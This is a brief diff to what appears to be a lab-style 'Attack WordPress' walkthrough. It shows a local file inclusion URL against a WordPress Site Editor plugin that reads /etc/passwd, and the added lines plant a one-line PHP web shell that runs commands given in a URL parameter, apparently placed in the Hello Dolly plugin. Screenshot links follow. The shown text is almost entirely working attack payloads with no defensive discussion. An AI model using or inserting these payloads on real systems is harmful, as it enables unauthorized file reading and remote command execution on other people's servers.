@@ -258,3 +258,8 @@ Attack WordPress
 ---
     http://192.168.0.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
 <img  alt="image" src="https://github.com/user-attachments/assets/d1cb67c7-2833-4e80-ad7f-90766bf3784a">
+
+    Hello Dolly
+    <?php system($_GET[2])?>
+<img  alt="image" src="https://github.com/user-attachments/assets/5c389929-ad87-42c2-b832-f7536a49081e">
+<img alt="image" src="https://github.com/user-attachments/assets/b7bf00e4-cbfc-463f-8f95-abad5e94de82">
